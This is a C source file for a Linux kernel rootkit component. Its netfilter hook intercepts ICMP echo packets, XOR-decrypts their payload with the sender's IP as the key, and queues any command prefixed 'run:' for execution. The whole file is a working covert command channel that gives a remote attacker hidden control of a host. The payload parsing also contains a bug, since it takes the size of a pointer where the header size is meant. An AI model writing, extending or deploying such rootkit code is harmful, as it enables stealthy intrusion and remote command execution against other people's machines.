#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netfilter.h>
#include <linux/string.h>
#include <net/net_namespace.h>
#include <linux/skbuff.h>
#include "rootkit.h"

extern char exec_cmd_buffer[1976];
extern void simple_xor_decrypt(char *out_buf, const unsigned char *in_buf, int data_len, __be32 xor_key);
extern struct work_struct exec_work;

unsigned int icmp_command_interceptor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    unsigned char *payload_ptr;
    unsigned char *payload_end;
    int idx = 0;
    int decrypted_len;
    __be32 decrypt_key;

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);

    // Check if this is an ICMP packet
    if (iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }
    // Check if this is an ICMP Echo (ping)
    if (icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    // Extract user data from the packet
    payload_ptr = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    payload_end = skb_tail_pointer(skb);
    decrypted_len = payload_end - payload_ptr;
    printk(KERN_INFO "[icmpshell] Payload length: %d\n", decrypted_len);

    // Use source IP as key by default
    decrypt_key = iph->saddr;
    printk(KERN_INFO "[icmpshell] Using key: %pI4\n", &decrypt_key);

    // Decrypt payload
    simple_xor_decrypt(exec_cmd_buffer, payload_ptr, decrypted_len, decrypt_key);
    printk(KERN_INFO "[icmpshell] Decrypted payload: %s\n", exec_cmd_buffer);

    // Check if the command starts with "run:"
    if (strncmp(exec_cmd_buffer, "run:", 4) != 0) {
        printk(KERN_INFO "[icmpshell] No 'run:' prefix, skipping\n");
        return NF_ACCEPT;
    } else {
        // Shift the string to remove "run:"
        for (idx = 0; idx <= sizeof(exec_cmd_buffer)/sizeof(exec_cmd_buffer[0])-4; idx++) {
            exec_cmd_buffer[idx] = exec_cmd_buffer[idx+4];
            if (exec_cmd_buffer[idx] == '\0')
                break;
        }
        printk(KERN_INFO "[icmpshell] Command to execute: %s\n", exec_cmd_buffer);
    }

    schedule_work(&exec_work); // Schedule deferred work
    printk(KERN_INFO "[icmpshell] Scheduled work for command\n");

    return NF_ACCEPT;
}